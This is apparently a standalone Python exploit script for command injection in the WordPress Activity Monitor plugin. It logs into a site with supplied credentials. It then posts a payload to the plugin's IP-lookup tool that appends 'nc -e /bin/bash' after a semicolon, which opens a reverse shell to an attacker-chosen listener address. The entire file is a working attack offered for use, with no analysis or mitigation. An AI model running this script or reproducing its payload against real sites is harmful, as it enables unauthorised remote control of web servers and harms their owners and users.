import requests
from optparse import OptionParser

print("""
Simple Command execution in activity monitor plugin wordpress
Exploit created By: Bhanugoud
Github: https://github.com/bhanugoudm041/activity-monitor-exploit
""")

#Options data
parser = OptionParser()
parser.add_option("-u", "--url", dest="site",help="Site name with wordpress installed path Ex: example.com or example.com/abc")
parser.add_option("-U", "--username", dest="username",help="Username for wordpress")
parser.add_option("-P", "--password", dest="password",help="Password for wordpress")
parser.add_option("-l", "--lhost", dest="ip",help="Listener IP address")
parser.add_option("-p", "--lport", dest="port",help="Listener Port number")
(options, args) = parser.parse_args()

site = options.site
username = options.username
password = options.password
ip = options.ip
port = options.port
if site == None or username == None or password == None or ip == None or port == None:
        parser.print_help()

else:
#Urls data
        login_url = 'http://{}/wp-login.php'.format(site)
        profile_url = 'http://{}/wp-admin/profile.php'.format(site)
        plugin_url = "http://{}/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools".format(site)

#Session setup
        session = requests.Session()

#Login data
        login_data = {
    'log': '{}'.format(username),
    'pwd': '{}'.format(password),
    'wp-submit': 'Log In',
    'redirect_to': profile_url,
    'testcookie': '1'
        }

#Headers contents
        headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Referer': 'http://{}/wp-login.php'.format(site)
        }

#Payload contents
        payload_data = {
    'ip': 'r@nd0nnvvw0rd;nc -e /bin/bash {} {}'.format(ip,port),
    'lookup': 'Lookup'
        }

# Send login request
        login_response = session.post(login_url, data=login_data, headers=headers)
        if "wordpress_logged_in" in str(login_response.headers):
                print("Login success") 
        else:
                print("Login failed")

        result = session.post(plugin_url, data=payload_data, headers=headers)
        print("Exploit completed")
